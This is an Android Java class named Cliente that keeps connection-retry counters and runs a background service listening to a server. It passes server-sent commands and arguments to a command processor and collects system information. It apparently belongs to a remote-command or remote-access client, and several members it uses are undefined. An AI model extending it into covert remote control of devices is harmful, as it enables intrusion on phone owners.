package Cliente;

import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

import java.sql.Connection;

import Controlador.Controler;
import Controlador.Transporte;

/**
 * Created by Vero on 19/05/2015.
 */
public class Cliente implements Controler {
    public final String TAG = Cliente.class.getSimpleName();
    Connection conn;

    int nbAttempts = 10; //sera décrementé a 5 pour 5 minute 3 pour  10 minute ..
    int elapsedTime = 1; // 1 minute

    boolean stop = false; //Pour que les threads puissent s'arreter en cas de déconnexion

    boolean isRunning = false; //Le service tourne
    boolean isListening = false; //Le service est connecté au serveur
    //final boolean waitTrigger = false; //On attend un évenement pour essayer de se connecter.
    Thread readthread;
    ProcessCommand procCmd ;
    byte[] cmd ;
    CommandPacket packet ;

    private Handler handler = new Handler() {

        public void handleMessage(Message msg) {
            Bundle b = msg.getData();
            processCommand(b);
        }
    };

    private void processCommand(Bundle b) {
        try{
            procCmd.process(b.getShort("command"),b.getByteArray("arguments"),b.getInt("chan"));
        }
        catch(Exception e) {
            sendError("Error on Client:"+e.getMessage());
        }
    }
    public void onCreate() {
        Log.i(TAG, "In onCreate");
        infos = new SystemInfo(this);
        procCmd = new ProcessCommand(this);

        loadPreferences();
    }

    @Override
    public void Storage(Transporte tp, String i) {

    }
}
